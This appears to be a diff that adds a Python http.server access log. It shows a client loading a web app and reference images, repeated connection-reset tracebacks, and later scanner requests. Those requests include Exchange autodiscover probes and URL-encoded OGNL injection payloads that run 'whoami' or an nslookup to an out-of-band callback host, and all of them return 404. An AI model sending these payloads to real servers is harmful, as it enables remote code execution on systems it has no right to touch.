@@ -1,0 +1,164 @@
+127.0.0.1 - - [26/Aug/2026 03:02:25] "GET / HTTP/1.1" 200 -
+178.104.53.233 - - [26/Aug/2026 03:02:25] "GET / HTTP/1.1" 200 -
+178.104.53.233 - - [26/Aug/2026 03:02:25] "GET /refs/ HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:33] "GET /refs/ HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:33] "GET /refs/liufang.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:33] "GET /refs/td_sweep.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:33] "GET /refs/part_compare.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:33] "GET /refs/dq_compare6.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:33] "GET /refs/spout_zoom.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:33] "GET /refs/qc_detail.png HTTP/1.1" 304 -
+119.56.79.26 - - [26/Aug/2026 03:06:34] "GET /refs/liufang_cmp.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:34] "GET /refs/liufang_qc.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:35] "GET /refs/refs_measured.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:35] "GET /refs/refs_all.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:35] "GET /refs/dq11.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:36] "GET /refs/lip.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:36] "GET /refs/lid_sweep.png HTTP/1.1" 304 -
+119.56.79.26 - - [26/Aug/2026 03:06:36] "GET /refs/bead.png HTTP/1.1" 304 -
+119.56.79.26 - - [26/Aug/2026 03:06:37] "GET /refs/fillet.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:37] "GET /refs/knob.png HTTP/1.1" 304 -
+119.56.79.26 - - [26/Aug/2026 03:06:37] "GET /refs/neck_after.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:37] "GET /refs/qc_duoqiu2.png HTTP/1.1" 304 -
+119.56.79.26 - - [26/Aug/2026 03:06:37] "GET /refs/handle_fix2.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:37] "GET /refs/xs_regress.png HTTP/1.1" 304 -
+119.56.79.26 - - [26/Aug/2026 03:06:37] "GET /refs/gp_regress.png HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:38] code 404, message File not found
+119.56.79.26 - - [26/Aug/2026 03:06:38] "GET /favicon.ico HTTP/1.1" 404 -
+119.56.79.26 - - [26/Aug/2026 03:06:50] "GET / HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:50] "GET /assets/index-DEqDxi-0.js HTTP/1.1" 200 -
+119.56.79.26 - - [26/Aug/2026 03:06:50] "GET /assets/index-Diu4_gQ2.css HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('119.56.79.26', 8093)
+----------------------------------------
+Exception occurred during processing of request from ('119.56.79.26', 1555)
+Traceback (most recent call last):
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('119.56.79.26', 48773)
+Exception occurred during processing of request from ('119.56.79.26', 65100)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+Traceback (most recent call last):
+ConnectionResetError: [Errno 104] Connection reset by peer
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+----------------------------------------
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+185.87.121.29 - - [26/Aug/2026 03:10:09] code 404, message File not found
+185.87.121.29 - - [26/Aug/2026 03:10:09] "GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 404 -
+185.87.121.29 - - [26/Aug/2026 03:10:09] code 404, message File not found
+185.87.121.29 - - [26/Aug/2026 03:10:09] "GET /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 404 -
+185.87.121.29 - - [26/Aug/2026 03:10:51] code 404, message File not found
+185.87.121.29 - - [26/Aug/2026 03:10:51] "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1" 404 -
+185.87.121.29 - - [26/Aug/2026 03:11:02] code 404, message File not found
+185.87.121.29 - - [26/Aug/2026 03:11:02] "GET /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20da72o9kupagfsqo2sf30433d7o767ew3m.oast.site%22%29%7D/ HTTP/1.1" 404 -
+----------------------------------------
+Exception occurred during processing of request from ('119.56.79.26', 44459)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception occurred during processing of request from ('119.56.79.26', 8617)
+Traceback (most recent call last):
+  File "/usr/lib/python3.12/socketserver.py", line 692, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.12/http/server.py", line 1311, in finish_request
+    self.RequestHandlerClass(request, client_address, self,
+  File "/usr/lib/python3.12/http/server.py", line 672, in __init__
+    super().__init__(*args, **kwargs)
+  File "/usr/lib/python3.12/socketserver.py", line 761, in __init__
+    self.handle()
+  File "/usr/lib/python3.12/http/server.py", line 436, in handle
+    self.handle_one_request()
+  File "/usr/lib/python3.12/http/server.py", line 404, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/socket.py", line 707, in readinto
+    return self._sock.recv_into(b)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
